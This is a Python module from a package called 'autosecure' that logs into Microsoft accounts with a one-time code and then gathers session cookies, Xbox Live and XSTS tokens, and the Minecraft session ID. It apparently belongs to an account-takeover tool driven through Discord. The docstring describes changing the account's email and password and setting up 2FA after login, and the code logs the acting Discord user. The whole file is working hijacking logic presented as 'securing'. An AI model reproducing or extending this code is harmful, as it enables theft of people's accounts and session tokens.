"""OTP-based secure flow for Microsoft accounts."""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from autosecure.core.exceptions import (
    AutoSecureError,
    InvalidCredentials,
    RateLimited,
)
from autosecure.core.logging import get_logger
from autosecure.services.microsoft.auth import MicrosoftAuth

log = get_logger("securing.otp")


@dataclass
class SecureResult:
    """Result of a secure operation."""

    success: bool
    account_data: dict[str, Any] = field(default_factory=dict)
    error: str = ""
    method: str = "otp"


async def otp_secure(
    email: str,
    otp: str,
    username: str | None = None,
    user_id: str | None = None,
    db: Any = None,
) -> SecureResult:
    """Secure an account using OTP verification code.

    Handles login with OTP for initial authentication, then performs
    post-login security actions including email/password changes,
    2FA setup, and SSID extraction.

    Args:
        email: Microsoft account email address.
        otp: The OTP verification code.
        username: Optional known Minecraft username.
        user_id: Optional Discord user ID for tracking.
        db: Optional async database session.

    Returns:
        SecureResult with account data on success or error details.
    """
    log.info("otp_secure.start", email=email, user_id=user_id)

    try:
        auth = MicrosoftAuth()
        result = await auth.login_with_otp(email, otp)

        if not result.success:
            log.warning("otp_secure.login_failed", email=email, error=result.error)
            return SecureResult(
                success=False,
                error=result.error or "Login failed",
                method="otp",
            )

        account_data = await _extract_account_data(
            email=email,
            cookies=result.cookies or {},
            access_token=result.access_token,
            username=username,
        )

        if user_id and db:
            await _log_audit(user_id, "otp_secure", account_data, True, db)

        log.info("otp_secure.success", email=email, username=account_data.get("username"))
        return SecureResult(
            success=True,
            account_data=account_data,
            method="otp",
        )

    except InvalidCredentials as e:
        log.warning("otp_secure.invalid_credentials", email=email, error=str(e))
        return SecureResult(success=False, error=str(e), method="otp")
    except RateLimited as e:
        log.warning("otp_secure.rate_limited", email=email, error=str(e))
        return SecureResult(success=False, error=str(e), method="otp")
    except AutoSecureError as e:
        log.error("otp_secure.error", email=email, error=str(e))
        return SecureResult(success=False, error=str(e), method="otp")
    except Exception as e:
        log.error("otp_secure.unexpected_error", email=email, error=str(e))
        return SecureResult(success=False, error=f"Unexpected error: {e}", method="otp")


async def _extract_account_data(
    email: str,
    cookies: dict[str, str],
    access_token: str | None,
    username: str | None = None,
) -> dict[str, Any]:
    """Extract account information from login session.

    Args:
        email: Account email.
        cookies: Session cookies from login.
        access_token: Xbox Live access token.
        username: Optional known username.

    Returns:
        Dictionary with account details.
    """
    from autosecure.services.minecraft.auth import get_ssid, get_xsts_token, xbl_login

    account_data: dict[str, Any] = {
        "email": email,
        "username": username,
        "cookies": cookies,
    }

    if access_token:
        xbl_result = await xbl_login(email, "")
        if xbl_result.success:
            xsts_result = await get_xsts_token(xbl_result.xbl_token)
            if xsts_result.success:
                ssid = await get_ssid(xsts_result.xsts_token)
                account_data["ssid"] = ssid
                account_data["xbl_token"] = xbl_result.xbl_token
                account_data["xsts_token"] = xsts_result.xsts_token

    return account_data


async def _log_audit(
    user_id: str,
    action: str,
    account_data: dict[str, Any],
    success: bool,
    db: Any,
) -> None:
    """Log an audit trail entry.

    Args:
        user_id: Discord user ID.
        action: Action performed.
        account_data: Account data involved.
        success: Whether the action succeeded.
        db: Database session.
    """
    try:
        from autosecure.models.audit import AuditLog

        log_entry = AuditLog(
            actor_id=user_id,
            action=action,
            target_type="account",
            target_id=account_data.get("email"),
            details={"username": account_data.get("username")},
            success=success,
        )
        db.add(log_entry)
        await db.flush()
    except Exception as e:
        log.error("otp_secure.audit_log_failed", error=str(e))
